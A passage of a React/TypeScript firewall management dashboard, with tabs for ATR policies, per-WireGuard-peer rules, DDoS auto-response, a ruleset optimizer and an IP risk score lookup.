          <div><div style={{ fontSize:10, color:"#555", marginBottom:3 }}>{form.scope==="signature"?"SID":"Category"}</div>
            <input style={inp} value={form.scope==="signature"?form.sid:form.category} onChange={e=>setForm(f=>form.scope==="signature"?{...f,sid:e.target.value}:{...f,category:e.target.value})} placeholder={form.scope==="signature"?"2100498":"exploit"} />
          </div>
          <div><div style={{ fontSize:10, color:"#555", marginBottom:3 }}>Action</div><select style={sel} value={form.action} onChange={e=>setForm(f=>({...f,action:e.target.value}))}>
            <option value="block">Block</option><option value="trap">Trap</option><option value="block_and_trap">Block+Trap</option><option value="notify">Notify</option>
          </select></div>
          <div><div style={{ fontSize:10, color:"#555", marginBottom:3 }}>Cooldown (min)</div><input style={inp} type="number" value={form.cooldownMins} onChange={e=>setForm(f=>({...f,cooldownMins:parseInt(e.target.value)||60}))} /></div>
          <button onClick={createPolicy} disabled={saving||!form.name} style={{ background:"#00ff8833", border:"1px solid #00ff8866", color:"#00ff88", borderRadius:4, padding:"6px 14px", fontSize:11, cursor:"pointer", alignSelf:"end" }}>
            {saving?"…":"+ Add"}
          </button>
        </div>
        {/* Policy table */}
        {loading ? <div style={{ color:"#555", fontSize:12 }}>Loading…</div> : (
          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
            <thead><tr style={{ color:"#555", borderBottom:"1px solid #1a1a1a" }}>
              {["Policy","Scope","Target","Action","Cooldown","Triggered","Enabled",""].map(h=><th key={h} style={{ textAlign:"left", padding:"4px 8px", fontWeight:500 }}>{h}</th>)}
            </tr></thead>
            <tbody>
              {policies.length===0&&<tr><td colSpan={8} style={{ color:"#444", textAlign:"center", padding:16 }}>No policies — click "Seed Default Policies" to get started</td></tr>}
              {policies.map(p=>(
                <tr key={p.id} style={{ borderBottom:"1px solid #111" }}>
                  <td style={{ padding:"5px 8px", color:"#ccc" }}>{p.name}</td>
                  <td style={{ padding:"5px 8px", color:"#888" }}>{p.scope}</td>
                  <td style={{ padding:"5px 8px", color:"#aaa", fontFamily:"monospace" }}>{p.sid??p.category??"—"}</td>
                  <td style={{ padding:"5px 8px" }}><Bdg label={p.action} color={ATR_ACTION_COLOR[p.action]??  "#888"} sm /></td>
                  <td style={{ padding:"5px 8px", color:"#888" }}>{p.cooldownMins}m</td>
                  <td style={{ padding:"5px 8px", color:"#00ff88", fontFamily:"monospace" }}>{p.triggeredCount}</td>
                  <td style={{ padding:"5px 8px" }}>
                    <button onClick={()=>togglePolicy(p)} style={{ background:"none", border:`1px solid ${p.enabled?"#00ff8844":"#333"}`, color:p.enabled?"#00ff88":"#444", borderRadius:4, padding:"2px 8px", fontSize:10, cursor:"pointer" }}>
                      {p.enabled?"ON":"OFF"}
                    </button>
                  </td>
                  <td style={{ padding:"5px 8px" }}>
                    <button onClick={()=>deletePolicy(p.id)} style={{ background:"none", border:"none", color:"#553333", cursor:"pointer" }}><Trash2 size={11}/></button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </FwmCard>
      <FwmCard>
        <SectionTitle title="📋 Recent ATR Events"/>
        {loading ? <div style={{ color:"#555", fontSize:12 }}>Loading…</div> : events.length===0 ? <div style={{ color:"#444", fontSize:12 }}>No ATR events yet. Events appear here when policies fire.</div> : (
          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
            <thead><tr style={{ color:"#555", borderBottom:"1px solid #1a1a1a" }}>
              {["Time","Source IP","Node","Policy","SID","Action","Hits"].map(h=><th key={h} style={{ textAlign:"left", padding:"4px 8px", fontWeight:500 }}>{h}</th>)}
            </tr></thead>
            <tbody>
              {events.map(e=>(
                <tr key={e.id} style={{ borderBottom:"1px solid #0d0d0d" }}>
                  <td style={{ padding:"4px 8px", color:"#555", fontFamily:"monospace", fontSize:10 }}>{new Date(e.triggeredAt).toLocaleString()}</td>
                  <td style={{ padding:"4px 8px", color:"#ff8844", fontFamily:"monospace" }}>{e.sourceIp}</td>
                  <td style={{ padding:"4px 8px", color:"#888" }}>#{e.nodeId}</td>
                  <td style={{ padding:"4px 8px", color:"#ccc" }}>{e.policyName}</td>
                  <td style={{ padding:"4px 8px", color:"#888", fontFamily:"monospace", fontSize:10 }}>{e.sid??"-"}</td>
                  <td style={{ padding:"4px 8px" }}><Bdg label={e.action} color={ATR_ACTION_COLOR[e.action]??"#888"} sm /></td>
                  <td style={{ padding:"4px 8px", color:"#aaa" }}>{e.triggerHits}</td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </FwmCard>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════
// ── Per-WireGuard-Peer Firewall Rules ──────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════════
type PeerRule = { id:number; name:string; publicKey:string; deviceName:string|null; nodeId:number|null; action:string; throttleKbps:number|null; reason:string|null; enabled:boolean; hitCount:number; lastHit:string|null; expiresAt:string|null; createdAt:string };
const PEER_ACTION_COLOR: Record<string,string> = { allow:"#00ff88", block:"#ff4444", throttle:"#ffaa00", trap:"#cc44ff" };

function PeerRulesTab() {
  const [rules, setRules]   = useState<PeerRule[]>([]);
  const [loading, setLoading] = useState(true);
  const [form, setForm]     = useState({ name:"", publicKey:"", deviceName:"", action:"block", reason:"", throttleKbps:"" });
  const [saving, setSaving] = useState(false);
  const [exporting, setExporting] = useState(false);

  const load = useCallback(async () => {
    setLoading(true);
    const d = await fetch("/api/firewall/peer-rules").then(r=>r.json()).catch(()=>({rules:[]}));
    setRules(d.rules ?? []);
    setLoading(false);
  }, []);
  useEffect(() => { load(); }, [load]);

  const create = async () => {
    if (!form.name || !form.publicKey) return;
    setSaving(true);
    await fetch("/api/firewall/peer-rules", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ ...form, throttleKbps:form.throttleKbps?parseInt(form.throttleKbps):undefined }) });
    setSaving(false);
    setForm({ name:"", publicKey:"", deviceName:"", action:"block", reason:"", throttleKbps:"" });
    load();
  };
  const toggle = async (r: PeerRule) => {
    await fetch(`/api/firewall/peer-rules/${r.id}`, { method:"PUT", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ enabled:!r.enabled }) });
    load();
  };
  const del = async (id: number) => {
    await fetch(`/api/firewall/peer-rules/${id}`, { method:"DELETE" });
    load();
  };
  const exportScript = () => {
    setExporting(true);
    window.open("/api/firewall/peer-rules/daemon-export", "_blank");
    setTimeout(()=>setExporting(false), 1000);
  };

  const inp: React.CSSProperties = { background:"#111", border:"1px solid #333", color:"#eee", borderRadius:4, padding:"5px 8px", fontSize:11, fontFamily:"monospace", width:"100%" };
  const sel: React.CSSProperties = { ...inp, cursor:"pointer" };

  return (
    <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
      <FwmCard>
        <SectionTitle title="🔑 Per-WireGuard-Peer Firewall Rules"/>
        <p style={{ color:"#666", fontSize:12, marginBottom:12 }}>
          Rules keyed to a WireGuard peer's <strong style={{ color:"#aaa" }}>public key</strong>, not just their assigned IP.
          Block, trap, or throttle a specific device regardless of IP address — zero-trust per peer.
        </p>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 2fr 1fr 80px 100px auto", gap:6, marginBottom:14, alignItems:"end" }}>
          <div><div style={{ fontSize:10, color:"#555", marginBottom:3 }}>Rule Name</div><input style={inp} value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} placeholder="Block compromised device" /></div>
          <div><div style={{ fontSize:10, color:"#555", marginBottom:3 }}>WireGuard Public Key</div><input style={inp} value={form.publicKey} onChange={e=>setForm(f=>({...f,publicKey:e.target.value}))} placeholder="base64-encoded public key" /></div>
          <div><div style={{ fontSize:10, color:"#555", marginBottom:3 }}>Device Name (opt.)</div><input style={inp} value={form.deviceName} onChange={e=>setForm(f=>({...f,deviceName:e.target.value}))} placeholder="Laptop / Phone" /></div>
          <div><div style={{ fontSize:10, color:"#555", marginBottom:3 }}>Action</div><select style={sel} value={form.action} onChange={e=>setForm(f=>({...f,action:e.target.value}))}>
            <option value="block">Block</option><option value="allow">Allow</option><option value="throttle">Throttle</option><option value="trap">Trap</option>
          </select></div>
          <div><div style={{ fontSize:10, color:"#555", marginBottom:3 }}>Throttle kbps</div><input style={inp} type="number" value={form.throttleKbps} onChange={e=>setForm(f=>({...f,throttleKbps:e.target.value}))} placeholder="only for throttle" /></div>
          <button onClick={create} disabled={saving||!form.name||!form.publicKey} style={{ background:"#00ff8833", border:"1px solid #00ff8866", color:"#00ff88", borderRadius:4, padding:"6px 14px", fontSize:11, cursor:"pointer", alignSelf:"end" }}>
            {saving?"…":"+ Add"}
          </button>
        </div>
        <div style={{ display:"flex", gap:8, marginBottom:12 }}>
          <button onClick={exportScript} disabled={exporting} style={{ background:"#1a1a2a", border:"1px solid #333", color:"#88aaff", borderRadius:4, padding:"5px 12px", fontSize:10, cursor:"pointer" }}>
            ⬇ Export iptables Script (.sh)
          </button>
          <button onClick={load} style={{ background:"none", border:"1px solid #333", color:"#666", borderRadius:4, padding:"5px 10px", fontSize:10, cursor:"pointer" }}><RefreshCw size={10}/></button>
        </div>
        {loading ? <div style={{ color:"#555", fontSize:12 }}>Loading…</div> : rules.length===0 ? (
          <div style={{ color:"#444", fontSize:12, padding:"20px 0", textAlign:"center" }}>No peer rules yet. Add a public key above to create a peer-specific firewall rule.</div>
        ) : (
          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
            <thead><tr style={{ color:"#555", borderBottom:"1px solid #1a1a1a" }}>
              {["Name","Public Key","Device","Action","Hits","Last Hit","Enabled",""].map(h=><th key={h} style={{ textAlign:"left", padding:"4px 8px", fontWeight:500 }}>{h}</th>)}
            </tr></thead>
            <tbody>
              {rules.map(r=>(
                <tr key={r.id} style={{ borderBottom:"1px solid #0d0d0d", opacity:r.enabled?1:0.5 }}>
                  <td style={{ padding:"5px 8px", color:"#ccc" }}>{r.name}</td>
                  <td style={{ padding:"5px 8px", color:"#888", fontFamily:"monospace", fontSize:9 }}>
                    {r.publicKey.slice(0,20)}…<CopyBtn text={r.publicKey}/>
                  </td>
                  <td style={{ padding:"5px 8px", color:"#888" }}>{r.deviceName??"-"}</td>
                  <td style={{ padding:"5px 8px" }}><Bdg label={r.action} color={PEER_ACTION_COLOR[r.action]??"#888"} sm /></td>
                  <td style={{ padding:"5px 8px", color:"#00ff88", fontFamily:"monospace" }}>{r.hitCount}</td>
                  <td style={{ padding:"5px 8px", color:"#555", fontSize:10 }}>{r.lastHit?new Date(r.lastHit).toLocaleString():"—"}</td>
                  <td style={{ padding:"5px 8px" }}>
                    <button onClick={()=>toggle(r)} style={{ background:"none", border:`1px solid ${r.enabled?"#00ff8844":"#333"}`, color:r.enabled?"#00ff88":"#444", borderRadius:4, padding:"2px 8px", fontSize:10, cursor:"pointer" }}>
                      {r.enabled?"ON":"OFF"}
                    </button>
                  </td>
                  <td style={{ padding:"5px 8px" }}>
                    <button onClick={()=>del(r.id)} style={{ background:"none", border:"none", color:"#553333", cursor:"pointer" }}><Trash2 size={11}/></button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </FwmCard>
      <div style={{ padding:"10px 14px", background:"#0a1a0a", border:"1px solid #1a2a1a", borderRadius:6, fontSize:11, color:"#446644" }}>
        <strong style={{ color:"#66aa66" }}>How it works:</strong> Peer rules are converted to iptables FORWARD rules. The daemon script uses <code style={{ color:"#88cc88", fontFamily:"monospace" }}>wg show wg0 allowed-ips</code> to resolve each public key to its assigned IP at runtime, then installs the matching iptables rule. Rules survive IP reassignment automatically.
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════
// ── Adaptive DDoS Shield ───────────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════════
type DdosConfig = { id:number; enabled:boolean; thresholdPps:number; windowSecs:number; action:string; rateLimitPps:number; autoUnblockMins:number; updatedAt:string };
type DdosEvent  = { id:number; sourceIp:string; nodeId:number; peakPps:number; durationSecs:number|null; actionTaken:string; blockedAt:string; unblockAt:string|null; resolvedAt:string|null };

function DdosTab() {
  const [config, setConfig]   = useState<DdosConfig|null>(null);
  const [events, setEvents]   = useState<DdosEvent[]>([]);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving]   = useState(false);

  const load = useCallback(async () => {
    setLoading(true);
    const [c, e] = await Promise.all([
      fetch("/api/firewall/ddos/config").then(r=>r.json()).catch(()=>null),
      fetch("/api/firewall/ddos/events?limit=50").then(r=>r.json()).catch(()=>({events:[]})),
    ]);
    setConfig(c);
    setEvents(e.events ?? []);
    setLoading(false);
  }, []);
  useEffect(() => { load(); }, [load]);

  const save = async () => {
    if (!config) return;
    setSaving(true);
    const updated = await fetch("/api/firewall/ddos/config", { method:"PUT", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ enabled:config.enabled, thresholdPps:config.thresholdPps, windowSecs:config.windowSecs, action:config.action, rateLimitPps:config.rateLimitPps, autoUnblockMins:config.autoUnblockMins }) }).then(r=>r.json());
    setConfig(updated);
    setSaving(false);
  };
  const resolve = async (id: number) => {
    await fetch(`/api/firewall/ddos/events/${id}/resolve`, { method:"POST" });
    load();
  };

  const inp: React.CSSProperties = { background:"#111", border:"1px solid #333", color:"#eee", borderRadius:4, padding:"5px 8px", fontSize:12, fontFamily:"monospace", width:110 };
  const sel: React.CSSProperties = { ...inp, cursor:"pointer" };

  return (
    <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
      <FwmCard>
        <SectionTitle title="🛡 Adaptive DDoS Auto-Response"/>
        <p style={{ color:"#666", fontSize:12, marginBottom:14 }}>
          Nodes report high-pps traffic sources via <code style={{ color:"#44aaff", fontFamily:"monospace" }}>POST /api/daemon-inbound/ddos-report</code>.
          When a source exceeds the threshold, the server automatically blocks it and schedules auto-unblock.
        </p>
        {loading || !config ? <div style={{ color:"#555", fontSize:12 }}>Loading config…</div> : (
          <div style={{ display:"flex", flexDirection:"column", gap:12 }}>
            <div style={{ display:"flex", alignItems:"center", gap:16, flexWrap:"wrap" }}>
              <label style={{ display:"flex", alignItems:"center", gap:8, fontSize:12, color:"#ccc" }}>
                <input type="checkbox" checked={config.enabled} onChange={e=>setConfig(c=>c?({...c,enabled:e.target.checked}):c)} />
                DDoS Auto-Response Enabled
              </label>
            </div>
            <div style={{ display:"grid", gridTemplateColumns:"repeat(5,1fr)", gap:10 }}>
              <div>
                <div style={{ fontSize:10, color:"#555", marginBottom:3 }}>Threshold (pps)</div>
                <input style={inp} type="number" value={config.thresholdPps} onChange={e=>setConfig(c=>c?({...c,thresholdPps:parseInt(e.target.value)||5000}):c)} />
              </div>
              <div>
                <div style={{ fontSize:10, color:"#555", marginBottom:3 }}>Window (sec)</div>
                <input style={inp} type="number" value={config.windowSecs} onChange={e=>setConfig(c=>c?({...c,windowSecs:parseInt(e.target.value)||10}):c)} />
              </div>
              <div>
                <div style={{ fontSize:10, color:"#555", marginBottom:3 }}>Action</div>
                <select style={sel} value={config.action} onChange={e=>setConfig(c=>c?({...c,action:e.target.value}):c)}>
                  <option value="rate_limit">Rate Limit</option>
                  <option value="block">Block</option>
                  <option value="throttle">Throttle</option>
                </select>
              </div>
              <div>
                <div style={{ fontSize:10, color:"#555", marginBottom:3 }}>Rate Limit (pps)</div>
                <input style={inp} type="number" value={config.rateLimitPps} onChange={e=>setConfig(c=>c?({...c,rateLimitPps:parseInt(e.target.value)||100}):c)} />
              </div>
              <div>
                <div style={{ fontSize:10, color:"#555", marginBottom:3 }}>Auto-Unblock (min)</div>
                <input style={inp} type="number" value={config.autoUnblockMins} onChange={e=>setConfig(c=>c?({...c,autoUnblockMins:parseInt(e.target.value)||30}):c)} />
              </div>
            </div>
            <div style={{ display:"flex", gap:8 }}>
              <button onClick={save} disabled={saving} style={{ background:"#00ff8833", border:"1px solid #00ff8866", color:"#00ff88", borderRadius:4, padding:"6px 16px", fontSize:11, cursor:"pointer" }}>
                {saving?"Saving…":"Save Config"}
              </button>
              <button onClick={load} style={{ background:"none", border:"1px solid #333", color:"#666", borderRadius:4, padding:"6px 12px", fontSize:11, cursor:"pointer" }}><RefreshCw size={11}/></button>
            </div>
          </div>
        )}
      </FwmCard>
      <FwmCard>
        <SectionTitle title={`🚨 DDoS Events (${events.filter(e=>!e.resolvedAt).length} active)`}/>
        <div style={{ marginBottom:10, display:"flex", gap:16, fontSize:11 }}>
          <span style={{ color:"#ff4444" }}>🔴 Active: {events.filter(e=>!e.resolvedAt).length}</span>
          <span style={{ color:"#555" }}>Total: {events.length}</span>
          <span style={{ color:"#00ff88" }}>Resolved: {events.filter(e=>e.resolvedAt).length}</span>
        </div>
        {loading ? <div style={{ color:"#555", fontSize:12 }}>Loading…</div> : events.length===0 ? (
          <div style={{ color:"#444", fontSize:12, padding:"20px 0", textAlign:"center" }}>No DDoS events. Events appear here when nodes report high-pps sources.</div>
        ) : (
          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
            <thead><tr style={{ color:"#555", borderBottom:"1px solid #1a1a1a" }}>
              {["Time","Source IP","Node","Peak PPS","Duration","Action","Auto-Unblock","Status",""].map(h=><th key={h} style={{ textAlign:"left", padding:"4px 8px", fontWeight:500 }}>{h}</th>)}
            </tr></thead>
            <tbody>
              {events.map(e=>(
                <tr key={e.id} style={{ borderBottom:"1px solid #0d0d0d", opacity:e.resolvedAt?0.4:1 }}>
                  <td style={{ padding:"4px 8px", color:"#555", fontFamily:"monospace", fontSize:10 }}>{new Date(e.blockedAt).toLocaleString()}</td>
                  <td style={{ padding:"4px 8px", color:"#ff8844", fontFamily:"monospace" }}>{e.sourceIp}</td>
                  <td style={{ padding:"4px 8px", color:"#888" }}>#{e.nodeId}</td>
                  <td style={{ padding:"4px 8px", color:"#ff4444", fontFamily:"monospace", fontWeight:700 }}>{e.peakPps.toLocaleString()}</td>
                  <td style={{ padding:"4px 8px", color:"#888" }}>{e.durationSecs?`${e.durationSecs}s`:"—"}</td>
                  <td style={{ padding:"4px 8px" }}><Bdg label={e.actionTaken} color="#ff6600" sm /></td>
                  <td style={{ padding:"4px 8px", color:"#888", fontSize:10 }}>{e.unblockAt?new Date(e.unblockAt).toLocaleString():"—"}</td>
                  <td style={{ padding:"4px 8px" }}><Bdg label={e.resolvedAt?"resolved":"active"} color={e.resolvedAt?"#555":"#ff4444"} sm /></td>
                  <td style={{ padding:"4px 8px" }}>
                    {!e.resolvedAt&&<button onClick={()=>resolve(e.id)} style={{ background:"none", border:"1px solid #333", color:"#666", borderRadius:3, padding:"2px 8px", fontSize:9, cursor:"pointer" }}>Resolve</button>}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </FwmCard>
      <div style={{ padding:"10px 14px", background:"#0a0a1a", border:"1px solid #1a1a2a", borderRadius:6, fontSize:11, color:"#446" }}>
        <strong style={{ color:"#6688cc" }}>Node integration:</strong> Deploy a cron/daemon on each node that monitors <code style={{ fontFamily:"monospace", color:"#88aacc" }}>nstat -s</code> or eBPF pps counters, and POSTs to <code style={{ fontFamily:"monospace", color:"#88aacc" }}>POST /api/daemon-inbound/ddos-report</code> with <code style={{ fontFamily:"monospace", color:"#88aacc" }}>{"{ nodeId, sourceIp, peakPps }"}</code> when the threshold is exceeded.
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════
// ── AI Firewall Rule Optimizer ─────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════════
type OptimizerResult = {
  score: number; grade: string;
  recommendations: Array<{ type:string; severity:string; title:string; detail:string; ruleIds?:number[] }>;
  stats: { totalRules:number; blockedIps:number; ipsSignatures:number; atrPolicies:number; geoBlocks:number; zones:number };
  analyzedAt: string;
};
const OPT_SEV_COLOR: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#4488ff" };
const GRADE_COLOR: Record<string,string> = { A:"#00ff88", B:"#44ff88", C:"#ffaa00", D:"#ff6600", F:"#ff2244" };

function OptimizerTab() {
  const [result, setResult]   = useState<OptimizerResult|null>(null);
  const [loading, setLoading] = useState(false);

  const analyze = async () => {
    setLoading(true);
    const d = await fetch("/api/firewall/optimizer/analyze", { method:"POST" }).then(r=>r.json()).catch(()=>null);
    setResult(d);
    setLoading(false);
  };

  const gradeColor = result ? (GRADE_COLOR[result.grade] ?? "#888") : "#888";

  return (
    <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
      <FwmCard>
        <SectionTitle title="🤖 AI Firewall Rule Optimizer"/>
        <p style={{ color:"#666", fontSize:12, marginBottom:14 }}>
          Analyzes your entire ruleset against traffic patterns to surface dead rules, conflicts, reorder opportunities,
          and missing ATR coverage. Similar to Palo Alto's Security Policy Optimizer — built natively.
        </p>
        <button onClick={analyze} disabled={loading} style={{ background:"#1a1a2a", border:"1px solid #4444aa", color:"#88aaff", borderRadius:6, padding:"8px 20px", fontSize:12, cursor:"pointer", marginBottom:16 }}>
          {loading ? "⏳ Analyzing ruleset…" : "🤖 Analyze Firewall Ruleset"}
        </button>
        {result && (
          <>
            {/* Score card */}
            <div style={{ display:"grid", gridTemplateColumns:"120px 1fr", gap:16, marginBottom:16, alignItems:"center" }}>
              <div style={{ textAlign:"center", background:"#0a0a0a", border:`2px solid ${gradeColor}44`, borderRadius:12, padding:"16px 0" }}>
                <div style={{ fontSize:48, fontWeight:900, color:gradeColor, fontFamily:"monospace", lineHeight:1 }}>{result.grade}</div>
                <div style={{ fontSize:11, color:"#555", marginTop:4 }}>Security Score</div>
                <div style={{ fontSize:24, color:gradeColor, fontWeight:700 }}>{result.score}/100</div>
              </div>
              <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr", gap:8 }}>
                {[
                  ["Total Rules", result.stats.totalRules, "#4488ff"],
                  ["Blocked IPs", result.stats.blockedIps, "#ff6600"],
                  ["IPS Sigs", result.stats.ipsSignatures, "#cc44ff"],
                  ["ATR Policies", result.stats.atrPolicies, "#00ff88"],
                  ["Geo Blocks", result.stats.geoBlocks, "#ffaa00"],
                  ["Zones", result.stats.zones, "#44aaff"],
                ].map(([label,val,color])=>(
                  <div key={String(label)} style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:6, padding:"8px 10px" }}>
                    <div style={{ fontSize:18, fontWeight:700, color:String(color), fontFamily:"monospace" }}>{val}</div>
                    <div style={{ fontSize:10, color:"#555" }}>{label}</div>
                  </div>
                ))}
              </div>
            </div>
            {/* Recommendations */}
            <div style={{ fontSize:12, color:"#888", marginBottom:8 }}>
              {result.recommendations.length === 0 ? "✅ No issues found — ruleset is optimal." : `${result.recommendations.length} recommendation(s) found:`}
            </div>
            <div style={{ display:"flex", flexDirection:"column", gap:8 }}>
              {result.recommendations.map((rec, i) => (
                <div key={i} style={{ background:"#0a0a0a", border:`1px solid ${OPT_SEV_COLOR[rec.severity]??  "#333"}44`, borderRadius:6, padding:"10px 14px" }}>
                  <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:4 }}>
                    <Bdg label={rec.severity} color={OPT_SEV_COLOR[rec.severity]??"#888"} sm />
                    <span style={{ fontSize:12, color:"#ccc", fontWeight:600 }}>{rec.title}</span>
                  </div>
                  <div style={{ fontSize:11, color:"#666" }}>{rec.detail}</div>
                  {rec.ruleIds && rec.ruleIds.length > 0 && (
                    <div style={{ marginTop:4, fontSize:10, color:"#555", fontFamily:"monospace" }}>
                      Affected rule IDs: {rec.ruleIds.join(", ")}
                    </div>
                  )}
                </div>
              ))}
            </div>
            <div style={{ marginTop:8, fontSize:10, color:"#333" }}>Analyzed at {new Date(result.analyzedAt).toLocaleString()}</div>
          </>
        )}
      </FwmCard>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════
// ── Composite IP Risk Score ─────────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════════
type RiskResult = { ip:string; score:number; riskLevel:string; riskColor:string; factors:Array<{factor:string;score:number;detail:string}>; computedAt:string };

function RiskScoreTab() {
  const [ip, setIp]         = useState("");
  const [result, setResult] = useState<RiskResult|null>(null);
  const [loading, setLoading] = useState(false);
  const [history, setHistory] = useState<RiskResult[]>([]);

  const lookup = async () => {
    if (!ip.trim()) return;
    setLoading(true);
    const d = await fetch(`/api/firewall/risk-score?ip=${encodeURIComponent(ip.trim())}`).then(r=>r.json()).catch(()=>null);
    if (d?.score !== undefined) {
      setResult(d);
      setHistory(h => [d, ...h.filter(r=>r.ip!==d.ip)].slice(0,20));
    }
    setLoading(false);
  };

  const scoreGradient = (score: number) => score >= 75 ? "#ff2222" : score >= 50 ? "#ff6600" : score >= 25 ? "#ffaa00" : "#00ff88";

  return (
    <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
      <FwmCard>
        <SectionTitle title="📊 Composite IP Risk Score"/>
        <p style={{ color:"#666", fontSize:12, marginBottom:14 }}>
          Aggregates intelligence from all sources — block lists, SilkWeb honeypot, ATR events, beacon alerts — into
          a single 0–100 risk score per IP. Use as a unified verdict instead of checking 5 separate tables.
        </p>
        <div style={{ display:"flex", gap:8, marginBottom:16 }}>
          <input
            value={ip} onChange={e=>setIp(e.target.value)} onKeyDown={e=>e.key==="Enter"&&lookup()}
            placeholder="Enter IP address to score…"
            style={{ flex:1, background:"#111", border:"1px solid #333", color:"#eee", borderRadius:4, padding:"8px 12px", fontSize:13, fontFamily:"monospace" }}
          />
          <button onClick={lookup} disabled={loading||!ip.trim()} style={{ background:"#1a1a2a", border:"1px solid #4444aa", color:"#88aaff", borderRadius:4, padding:"8px 18px", fontSize:12, cursor:"pointer" }}>
            {loading?"Scoring…":"Score IP"}
          </button>
        </div>
        {result && (
          <div style={{ display:"grid", gridTemplateColumns:"180px 1fr", gap:16, alignItems:"start" }}>
            {/* Score dial */}
            <div style={{ textAlign:"center", background:"#0a0a0a", border:`2px solid ${result.riskColor}44`, borderRadius:12, padding:"20px 0" }}>
              <div style={{ fontSize:10, color:"#555", marginBottom:4 }}>RISK SCORE</div>
              <div style={{ fontSize:52, fontWeight:900, color:result.riskColor, fontFamily:"monospace", lineHeight:1 }}>{result.score}</div>
              <div style={{ fontSize:12, color:"#555", margin:"4px 0" }}>/100</div>
              <Bdg label={result.riskLevel} color={result.riskColor} />
              <div style={{ fontSize:10, color:"#888", marginTop:8, fontFamily:"monospace" }}>{result.ip}</div>
            </div>
            {/* Factor breakdown */}
            <div>
              <div style={{ fontSize:11, color:"#666", marginBottom:8 }}>Risk factors:</div>
              {result.factors.length === 0 ? (
                <div style={{ color:"#444", fontSize:12 }}>No risk signals detected — IP appears clean.</div>
              ) : (
                <div style={{ display:"flex", flexDirection:"column", gap:6 }}>
                  {result.factors.map((f,i) => (
                    <div key={i} style={{ display:"flex", alignItems:"center", gap:10, background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:6, padding:"8px 12px" }}>
                      <div style={{ width:36, height:36, borderRadius:"50%", background:`${scoreGradient(f.score)}22`, border:`1px solid ${scoreGradient(f.score)}44`, display:"flex", alignItems:"center", justifyContent:"center", fontSize:13, fontWeight:700, color:scoreGradient(f.score), fontFamily:"monospace", flexShrink:0 }}>
                        +{f.score}
                      </div>
                      <div>
                        <div style={{ fontSize:12, color:"#ccc", fontWeight:600 }}>{f.factor}</div>
                        <div style={{ fontSize:11, color:"#666" }}>{f.detail}</div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}
      </FwmCard>
      {history.length > 0 && (
        <FwmCard>
        <SectionTitle title="Recent Lookups"/>
          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
            <thead><tr style={{ color:"#555", borderBottom:"1px solid #1a1a1a" }}>
              {["IP","Score","Risk Level","Factors","Computed At",""].map(h=><th key={h} style={{ textAlign:"left", padding:"4px 8px", fontWeight:500 }}>{h}</th>)}
            </tr></thead>
            <tbody>
              {history.map(r=>(
                <tr key={r.ip} style={{ borderBottom:"1px solid #0d0d0d", cursor:"pointer" }} onClick={()=>{ setIp(r.ip); setResult(r); }}>
                  <td style={{ padding:"5px 8px", color:"#aaa", fontFamily:"monospace" }}>{r.ip}</td>
                  <td style={{ padding:"5px 8px" }}>
                    <div style={{ display:"inline-block", background:`${r.riskColor}22`, color:r.riskColor, border:`1px solid ${r.riskColor}44`, borderRadius:4, padding:"1px 8px", fontSize:12, fontFamily:"monospace", fontWeight:700 }}>{r.score}</div>
                  </td>
                  <td style={{ padding:"5px 8px" }}><Bdg label={r.riskLevel} color={r.riskColor} sm /></td>
                  <td style={{ padding:"5px 8px", color:"#666" }}>{r.factors.length} factor(s)</td>
                  <td style={{ padding:"5px 8px", color:"#555", fontSize:10 }}>{new Date(r.computedAt).toLocaleString()}</td>
                  <td style={{ padding:"5px 8px" }}>
                    <button onClick={e=>{e.stopPropagation();lookup();}} style={{ background:"none", border:"1px solid #333", color:"#666", borderRadius:3, padding:"2px 6px", fontSize:9, cursor:"pointer" }}>Re-score</button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </FwmCard>
      )}
    </div>
  );
}

// ── My Persistent Rules Tab ───────────────────────────────────────────────────
// Per-user firewall rules stored in Postgres. Survive server restart, logoff,
// and VPN reconnection. Written to nftables immediately on every change.
interface UserFwRule {
  id: number;
  label: string;
  protocol: "tcp" | "udp" | "both";
  direction: "inbound" | "outbound" | "both";
  action: "allow" | "block";
  externalPort: number;
  internalPort: number | null;
  sourceIp: string | null;
  tunnelIp: string | null;
  notes: string | null;
  enabled: boolean;
  synced: boolean;
  hitCount: number;
  lastHitAt: string | null;
  createdAt: string;
}

const PROTO_COLOR: Record<string, string> = { tcp:"#4af", udp:"#fa4", both:"#a4f" };
const DIR_COLOR:   Record<string, string> = { inbound:"#f64", outbound:"#4f8", both:"#f84" };
const ACT_COLOR:   Record<string, string> = { allow:"#00ff88", block:"#ff4444" };

const EMPTY_FORM = {
  label:"", protocol:"tcp" as const, direction:"inbound" as const,
